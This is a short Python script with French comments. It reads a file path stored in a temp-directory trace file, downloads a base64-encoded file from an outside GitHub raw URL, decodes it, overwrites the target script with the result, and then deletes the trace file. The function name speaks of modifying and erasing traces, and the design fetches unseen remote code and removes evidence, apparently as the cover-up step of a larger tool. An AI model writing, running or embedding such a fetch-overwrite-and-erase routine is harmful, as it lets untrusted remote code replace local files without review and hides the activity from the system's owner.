import tempfile
import os
import requests
import base64

def modifier_et_supprimer_trace():
    temp_dir = tempfile.gettempdir()  # Récupère le chemin temp réel
    fichier_temp = os.path.join(temp_dir, "s_path.txt")
    raw_url = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.b64"  # fichier base64

    print(f"[i] Temp dir : {temp_dir}")
    print(f"[i] Fichier trace : {fichier_temp}")

    if not os.path.isfile(fichier_temp):
        print("[!] Le fichier s_path.txt est introuvable.")
        return

    with open(fichier_temp, "r") as f:
        chemin_script = f.read().strip()

    print(f"[i] Chemin lu dans le fichier : {chemin_script}")

    if not os.path.isfile(chemin_script):
        print(f"[!] Fichier cible introuvable : {chemin_script}")
        return

    try:
        print(f"[...] Téléchargement depuis {raw_url}")
        r = requests.get(raw_url, timeout=10)
        if r.status_code == 200 and r.text.strip():
            contenu_base64 = r.text.strip()
            try:
                contenu_decode = base64.b64decode(contenu_base64).decode("utf-8")
            except Exception as e:
                print(f"[!] Erreur lors du décodage base64 : {e}")
                return

            with open(chemin_script, "w", encoding="utf-8") as f_script:
                f_script.write(contenu_decode)
            print(f"[✓] Script mis à jour avec succès : {chemin_script}")
        else:
            print(f"[!] Échec du téléchargement. Code HTTP : {r.status_code}")
            return
    except Exception as e:
        print(f"[!] Erreur lors du téléchargement : {e}")
        return

    try:
        os.remove(fichier_temp)
        print("[✓] Fichier s_path.txt supprimé.")
    except Exception as e:
        print(f"[!] Erreur lors de la suppression : {e}")

if __name__ == "__main__":
    modifier_et_supprimer_trace()
